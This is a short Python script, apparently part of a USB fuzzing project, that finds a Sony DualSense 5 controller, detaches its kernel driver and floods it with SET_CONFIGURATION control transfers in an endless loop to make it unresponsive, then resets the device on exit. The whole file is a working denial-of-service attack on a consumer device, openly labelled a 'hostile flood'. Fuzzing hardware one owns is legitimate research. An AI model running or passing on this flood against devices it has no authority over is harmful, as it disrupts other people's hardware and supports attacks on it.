# fuzz_ds5.py
# Phase 2: The "DOS"
# Low-level, hostile flood that causes the DOS.
# --- NEW: Now includes a USB reset on exit ---

import usb.core
import usb.util
import sys
import time # NEW: Added for the reset delay

VENDER_ID = 0x054C
PRODUCT_ID = 0x0CE6

print(f"Looking for device: {VENDER_ID:04x}:{PRODUCT_ID:0x} (DualSense 5)...")
dev = usb.core.find(idVendor=VENDER_ID, idProduct=PRODUCT_ID)
if dev is None:
    print("Device not found. Is it plugged in?")
    sys.exit(1)

print("Device found!")

# Detach the kernel driver so we can flood it
try:
    if dev.is_kernel_driver_active(0):
        print("Detaching kernel driver...")
        dev.detach_kernel_driver(0)
        print("Kernel driver detached.")
except Exception as e:
    print(f"Could not detach driver: {e}")
    pass

print("\n[PHASE 2: DOS] Starting HEAVY flood. Press CTRL+C to stop.")
print("The controller should now be unresponsive.")

try:
    while True:
        try:
            # The "SET_CONFIGURATION" flood
            dev.ctrl_transfer(
                0x00, 0x09, 0x0001, 0, 0
            )
        except Exception as e:
            pass # Keep flooding
except KeyboardInterrupt:
    # --- THIS IS THE UPDATED CLEANUP BLOCK ---
    print("\nAttack stopped. Resetting and releasing device...")
    try:
        # --- NEW STEP ---
        # Send a USB RESET command, which is the
        # software equivalent of unplugging and replugging.
        print("Sending USB reset signal...")
        dev.reset()
        print("Reset signal sent.")
        
        # Give the OS a second to re-detect the reset device
        time.sleep(1) 
        
        # --- OLD STEP ---
        # Now, try to re-attach the kernel driver
        print("Re-attaching kernel driver...")
        dev.attach_kernel_driver(0)
        print("Re-attached kernel driver.")
    except Exception as e:
        # This might fail if the device is badly frozen
        print(f"Error during cleanup: {e}")
        print("If controller is still frozen, you may need to unplug/replug.")
    
    usb.util.release_interface(dev, 0)
    print("Device released.")
